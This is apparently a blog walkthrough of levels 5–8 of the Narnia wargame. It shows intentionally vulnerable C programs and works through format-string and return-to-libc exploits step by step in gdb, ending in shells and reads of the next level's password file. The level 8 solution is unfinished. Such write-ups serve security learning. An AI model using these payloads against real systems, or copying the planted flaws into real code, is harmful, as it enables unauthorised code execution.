---
extends: default.liquid
title: Solving Narnia Part 2
date: 2015-04-13T21:03:50Z
summary: Carrying on from Part 1
---

Carrying on from [Part 1](/posts/2015-04-08-solving-narnia-part1/)

## Level 05

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);
    buffer[sizeof (buffer) - 1] = 0;
    printf("Change i's value from 1 -> 500. ");

    if(i==500){
        printf("GOOD\n");
        system("/bin/sh");
    }

    printf("No way...let me give you a hint!\n");
    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
    printf ("i = %d (%p)\n", i, &i);
    return 0;
}
```

A fixed sized buffer again. This time however trying to overflow it in order to write to `i` won't work. If we look at line 9 and lookup the manpage for `snprintf` we see that

> The functions snprintf() and vsnprintf() write at most size bytes (including the trailing null byte ('0')) to str.

So we won't be able to overflow this buffer. Going through the usual possible exploits we've only really go one more to try: [format string attack](https://en.wikipedia.org/wiki/Uncontrolled_format_string) or _uncontrolled format string vulnerability_. This happens when user input isn't checked, and allows the user to use format characters (`%s`, `%x`) to read or manipulate the stack.

For me this is one of the harder exploits to understand, so this level is great practice for me. So if it doesn't make sense at first, stick with it and try various strings. Hopefully you'll grok it at some point.

Let's check to see if our hunch is right. Using a few characters to start, I then append a list of `%x`, which read values from the stack and print them.

```sourceCode
narnia5@melinda:/narnia$ ./narnia5 `python -c "print 'aaaa'+'%x'*10"`
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)
i = 1 (0xffffd6cc)
```

Sure enough we see the beginning of the input string after the 4th `%x`. So we then put the address if `i` into that location like and shorten the number of `%x`.

```sourceCode
narnia5@melinda:/narnia$ ./narnia5 `python -c "print '\xcc\xd6\xff\xff'+'%x'*5"`
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)
i = 1 (0xffffd6cc)
```

Now we have the address of `i`, we use `%n` to write to that address, remembering to remove one `%x` to keep the right length.

```sourceCode
narnia5@melinda:/narnia$ ./narnia5 `python -c "print '\xcc\xd6\xff\xff'+'%x'*4 + '%n'"`
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)
i = 36 (0xffffd6cc)
```

So we see that we've written the length of the string into `i`. We already have a value of 36, but we need 500. To achieve this we need to pad the string.

```sourceCode
narnia5@melinda:/narnia$ ./narnia5 $(python -c "print '\xcc\xd6\xff\xff'+'%x'*3 + '%500d' + '%n'")
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)
i = 528 (0xffffd6cc)
```

We're _28_ over the target, so let's reduce the padding

```sourceCode
narnia5@melinda:/narnia$ ./narnia5 $(python -c "print '\xcc\xd6\xff\xff'+'%x'*3 + '%472d' + '%n'")
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
[password]
```

## Level 06

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int  (*fp)(char *)=(int(*)(char *))&puts, i;

    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

    /* clear environ */
    for(i=0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));
    /* clear argz    */
    for(i=3; argv[i] != NULL; i++)
        memset(argv[i], '\0', strlen(argv[i]));

    strcpy(b1,argv[1]);
    strcpy(b2,argv[2]);
    //if(((unsigned long)fp & 0xff000000) == 0xff000000)
    if(((unsigned long)fp & 0xff000000) == get_sp())
        exit(-1);
    fp(b1);

    exit(1);
}
```

In this rather complicated looking listing we notice a few things:

- line 17 is a function pointer to `puts`
- line 33 calls the function `fp` points to
- line 31 prevents `fp` from pointing to anything in our frame

The last lines means we need to point `fp` to a call in a system library. This is going to be a [ret to libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack). We need to find the location of the function we want to execute. We want a shell, so our best option would be to execute `system('/bin/sh')`. As luck would have it, `puts` and `system` both have the same function definition: `int system(const char *command);` and `int puts(const char *s);`

Let's fire up gdb and figure out our addresses.

```sourceCode
narnia6@melinda:/narnia$ gdb ./narnia6 -q
Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 <+0>: push   %ebp
   0x0804855a <+1>: mov    %esp,%ebp
   0x0804855c <+3>: push   %ebx
   0x0804855d <+4>: and    $0xfffffff0,%esp
   0x08048560 <+7>: sub    $0x30,%esp

    <-- snip -->

   0x0804869b <+322>:   movl   $0xffffffff,(%esp)
   0x080486a2 <+329>:   call   0x8048410 <exit@plt>
   0x080486a7 <+334>:   lea    0x20(%esp),%eax
   0x080486ab <+338>:   mov    %eax,(%esp)
   0x080486ae <+341>:   mov    0x28(%esp),%eax
   0x080486b2 <+345>:   call   *%eax                <-- calling *fp*
   0x080486b4 <+347>:   movl   $0x1,(%esp)
   0x080486bb <+354>:   call   0x8048410 <exit@plt>
End of assembler dump.

(gdb) break *0x080486b2
Breakpoint 1 at 0x80486b2
(gdb) r aaaaaaaabbbb ccccccccdddd
Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd

Breakpoint 1, 0x080486b2 in main ()
(gdb) x/50wx $esp
0xffffd680: 0xffffd6a0  0xffffd8ac  0x00000021  0x08048712
0xffffd690: 0x00000003  0xffffd754  0x63636363  0x63636363
0xffffd6a0: 0x64646464  0x61616100  0x62626262  0x00000000
0xffffd6b0: 0x080486c0  0xf7fca000  0x00000000  0xf7e3ca63
0xffffd6c0: 0x00000003  0xffffd754  0xffffd764  0xf7feacea
0xffffd6d0: 0x00000003  0xffffd754  0xffffd6f4  0x08049978
0xffffd6e0: 0x08048290  0xf7fca000  0x00000000  0x00000000
0xffffd6f0: 0x00000000  0x32aaee13  0x0a932a03  0x00000000
0xffffd700: 0x00000000  0x00000000  0x00000003  0x08048450
0xffffd710: 0x00000000  0xf7ff0500  0xf7e3c979  0xf7ffd000
0xffffd720: 0x00000003  0x08048450  0x00000000  0x08048471
0xffffd730: 0x08048559  0x00000003  0xffffd754  0x080486c0
0xffffd740: 0x08048730  0xf7feb180
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e62cd0 <system>
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
```

What I did here was to disassemble the `main` function and find out where `fp` is getting called, so that I can set a breakpoint on it. Then I run the binary and inspect the stack before the call to `fp`. What we see is that `$esp` points to `0xffffd6a0`, which is where the last 4 values of `b2` are stored. This is also the argument that will be passed to the `fp` call. Function arguments are pushed onto the stack before a function is called. So We want this to point to `/bin/sh`, and we want `fp` to point to `system`. This is the reason for the `p system`, it tells us the location of `system`. Also note that our `segfault` is showing us the last 4 digits of `b1`. Perfect, I can use that to overwrite `fp` with the address of `system` and I should be good to go.

As this is a little more advanced, let's go over the steps:

- Get the address of the argument to whatever `fp` points to
- Figure out how to overwrite that with our argument
- Get the address of `system`
- Overwrite what `fp` points to with `system`'s address
- Assemble payload and hopefully get a shell

So the last step:

```sourceCode
narnia6@melinda:/narnia$ /games/narnia/narnia6 `python -c "print 'a'*8 + '\xd0\x2c\xe6\xf7' +' '+ 'b'*8 + '/bin/sh'"`
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
[password]
```

## Level 07

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
    char buffer[128];
    int (*ptrf)();

    memset(buffer, 0, sizeof(buffer));
    printf("goodfunction() = %p\n", goodfunction);
    printf("hackedfunction() = %p\n\n", hackedfunction);

    ptrf = goodfunction;
    printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

    printf("I guess you want to come to the hackedfunction...\n");
    sleep(2);
    ptrf = goodfunction;

    snprintf(buffer, sizeof buffer, format);

    return ptrf();
}

int main(int argc, char **argv){
    if (argc <= 1){
            fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
            exit(-1);
    }
    exit(vuln(argv[1]));
}

int goodfunction(){
    printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
    fflush(stdout);

    return 0;
}

int hackedfunction(){
    printf("Way to go!!!!");
    fflush(stdout);
    system("/bin/sh");

    return 0;
}
```

The presence of `snprintf` indicates that this will be another format string attack. Great, another one of my least favourites. This should help imprint it on my brain though, so let's attack this

```sourceCode
(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd <+0>: push   %ebp
   0x080485ce <+1>: mov    %esp,%ebp
   0x080485d0 <+3>: sub    $0xa8,%esp
   0x080485d6 <+9>: movl   $0x80,0x8(%esp)
   0x080485de <+17>:    movl   $0x0,0x4(%esp)
   0x080485e6 <+25>:    lea    -0x88(%ebp),%eax
   0x080485ec <+31>:    mov    %eax,(%esp)
   0x080485ef <+34>:    call   0x80484b0 <memset@plt>
   0x080485f4 <+39>:    movl   $0x80486e0,0x4(%esp)
   0x080485fc <+47>:    movl   $0x80487d0,(%esp)
   0x08048603 <+54>:    call   0x8048420 <printf@plt>
   0x08048608 <+59>:    movl   $0x8048706,0x4(%esp)
   0x08048610 <+67>:    movl   $0x80487e5,(%esp)
   0x08048617 <+74>:    call   0x8048420 <printf@plt>
   0x0804861c <+79>:    movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 <+89>:    mov    -0x8c(%ebp),%eax
   0x0804862c <+95>:    lea    -0x8c(%ebp),%edx
   0x08048632 <+101>:   mov    %edx,0x8(%esp)
   0x08048636 <+105>:   mov    %eax,0x4(%esp)
   0x0804863a <+109>:   movl   $0x80487fd,(%esp)
   0x08048641 <+116>:   call   0x8048420 <printf@plt>
   0x08048646 <+121>:   movl   $0x8048818,(%esp)
   0x0804864d <+128>:   call   0x8048450 <puts@plt>
   0x08048652 <+133>:   movl   $0x2,(%esp)
   0x08048659 <+140>:   call   0x8048440 <sleep@plt>
   0x0804865e <+145>:   movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 <+155>:   mov    0x8(%ebp),%eax
   0x0804866b <+158>:   mov    %eax,0x8(%esp)
   0x0804866f <+162>:   movl   $0x80,0x4(%esp)
   0x08048677 <+170>:   lea    -0x88(%ebp),%eax
   0x0804867d <+176>:   mov    %eax,(%esp)
   0x08048680 <+179>:   call   0x80484c0 <snprintf@plt>
   0x08048685 <+184>:   mov    -0x8c(%ebp),%eax
   0x0804868b <+190>:   call   *%eax
   0x0804868d <+192>:   leave
   0x0804868e <+193>:   ret
End of assembler dump.
(gdb) break *0x08048685
```

So disassmble the `vuln` function and set a break point just before the call of the function pointer. In the process of this challenge I learned of a nice way to determine the number of `%x` you need. Using `ltrace` it's possible to increment the number of `%x` 's until you see your string in the output again. I'll paste only the correcy output here

```sourceCode
narnia7@melinda:/narnia$ ltrace ./narnia7 `python -c "print 'aaaabbbb' + '%x'*7"`
__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 <unfinished ...>
memset(0xffffd630, '\0', 128)                                = 0xffffd630
printf("goodfunction() = %p\n", 0x80486e0goodfunction() = 0x80486e0
)                   = 27
printf("hackedfunction() = %p\n\n", 0x8048706hackedfunction() = 0x8048706

)               = 30
printf("before : ptrf() = %p (%p)\n", 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
) = 41
puts("I guess you want to come to the "...I guess you want to come to the hackedfunction...
)                  = 50
sleep(2)                                                     = 0
snprintf("aaaabbbb8048238ffffd688f7ffda940"..., 128, "aaaabbbb%x%x%x%x%x%x%x", 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
puts("Welcome to the goodfunction, but"...Welcome to the goodfunction, but i said the Hackedfunction..
)                  = 61
fflush(0xf7fcaac0)                                           = 0
exit(0 <no return ...>
+++ exited (status 0) +++
```

You can see the _aaaa_ and _bbbb_ at line 14. So we have 7 `%x` to get the second value.

Let's take a look at the stack with that input

```sourceCode
(gdb) r $(python -c "print 'aaaabbbb' + '%x'*7")
Starting program: /games/narnia/narnia7 $(python -c "print 'aaaabbbb' + '%x'*7")
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0: 0xffffd610  0x00000080  0xffffd8a2  0x08048238
0xffffd600: 0xffffd668  0xf7ffda94  0x00000000  0x080486e0
0xffffd610: 0x61616161  0x62626262  0x38343038  0x66383332
0xffffd620: 0x64666666  0x66383636  0x64666637  0x30343961
0xffffd630: 0x38343038  0x36306536  0x36313631  0x36313631
0xffffd640: 0x36323632  0x00323632  0x00000000  0x00000000
0xffffd650: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd660: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd670: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd680: 0x00000000  0x00000000  0x00000000  0x00000000
```

So at `0xffffd60c` is the address of `goodfunction`. We need to overwrite that to point to `0x8048706`, our `hackedfunction`. So as before in [level 05](https://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05) we use `%n` to try and overwrite this value.

```sourceCode
(gdb) r $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'")

Starting program: /games/narnia/narnia7 $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'")
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0: 0xffffd610  0x00000080  0xffffd8a2  0x08048238
0xffffd600: 0xffffd668  0xf7ffda94  0x00000000  0x0000002f
0xffffd610: 0x61616161  0xffffd60c  0x38343038  0x66383332
0xffffd620: 0x64666666  0x66383636  0x64666637  0x30343961
0xffffd630: 0x38343038  0x36306536  0x36313631  0x00313631
0xffffd640: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd650: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd660: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd670: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd680: 0x00000000  0x00000000  0x00000000  0x00000000
```

The value of _2f_ at `0xffffd60c` shows us that our overwrite was successful and we wrote the value of _47_. We need to write `0x8048706` which is `134514438` in decimal. So let's add our `%d` in and remember to adjust the number of `%x`s too, so we can see how much padding we need

```sourceCode
(gdb) r $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%d%n'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%d%n'")
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0: 0xffffd610  0x00000080  0xffffd8a2  0x08048238
0xffffd600: 0xffffd668  0xf7ffda94  0x00000000  0x00000031
0xffffd610: 0x61616161  0xffffd60c  0x38343038  0x66383332
0xffffd620: 0x64666666  0x66383636  0x64666637  0x30343961
0xffffd630: 0x38343038  0x31306536  0x37333336  0x37383137
0xffffd640: 0x00000033  0x00000000  0x00000000  0x00000000
0xffffd650: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd660: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd670: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd680: 0x00000000  0x00000000  0x00000000  0x00000000
```

Ok, so `0x8048706 - 0x00000031 = 0x80486d6` or _134514389_ in decimal. Let's see if I'm right

```sourceCode
(gdb) r $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514389d%n'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514389d%n'")
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0: 0xffffd610  0x00000080  0xffffd899  0x08048238
0xffffd600: 0xffffd668  0xf7ffda94  0x00000000  0x080486fc
0xffffd610: 0x61616161  0xffffd60c  0x38343038  0x66383332
0xffffd620: 0x64666666  0x66383636  0x64666637  0x30343961
0xffffd630: 0x38343038  0x20306536  0x20202020  0x20202020
0xffffd640: 0x20202020  0x20202020  0x20202020  0x20202020
0xffffd650: 0x20202020  0x20202020  0x20202020  0x20202020
0xffffd660: 0x20202020  0x20202020  0x20202020  0x20202020
0xffffd670: 0x20202020  0x20202020  0x20202020  0x20202020
0xffffd680: 0x20202020  0x20202020  0x20202020  0x00202020
```

Still a little off. Adjusting the value again

```sourceCode
(gdb) r $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'")
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0: 0xffffd610  0x00000080  0xffffd899  0x08048238
0xffffd600: 0xffffd668  0xf7ffda94  0x00000000  0x08048706
0xffffd610: 0x61616161  0xffffd60c  0x38343038  0x66383332
0xffffd620: 0x64666666  0x66383636  0x64666637  0x30343961
0xffffd630: 0x38343038  0x20306536  0x20202020  0x20202020
0xffffd640: 0x20202020  0x20202020  0x20202020  0x20202020
0xffffd650: 0x20202020  0x20202020  0x20202020  0x20202020
0xffffd660: 0x20202020  0x20202020  0x20202020  0x20202020
0xffffd670: 0x20202020  0x20202020  0x20202020  0x20202020
0xffffd680: 0x20202020  0x20202020  0x20202020  0x00202020
(gdb) c
Continuing.
Way to go!!!!$
```

And now we need to run it from the commandline to actually get a proper setuid shell

```sourceCode
narnia7@melinda:/narnia$ .//narnia7 $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'")
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@melinda:/narnia$ .//narnia7 $(python -c "print 'aaaa\x1c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'")
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whomai
/bin/sh: 1: whomai: not found
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
[password]
```

Notice that the address of `ptrf` is not the same in the shell :)

## Level 08

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global unti i find a fix
// -morla
int i;

void func(char *b){
    char *blah=b;
    char bok[20];
    //int i=0;

    memset(bok, '\0', sizeof(bok));
    for(i=0; blah[i] != '\0'; i++)
        bok[i]=blah[i];

    printf("%s\n",bok);
}

int main(int argc, char **argv){

    if(argc > 1)
        func(argv[1]);
    else
    printf("%s argument\n", argv[0]);

    return 0;
}
```

I'm struggling with this, and rather than delay the whole post because of the last level, I decided to post anyway. I'll update this when I have this figured out.

Sorry.
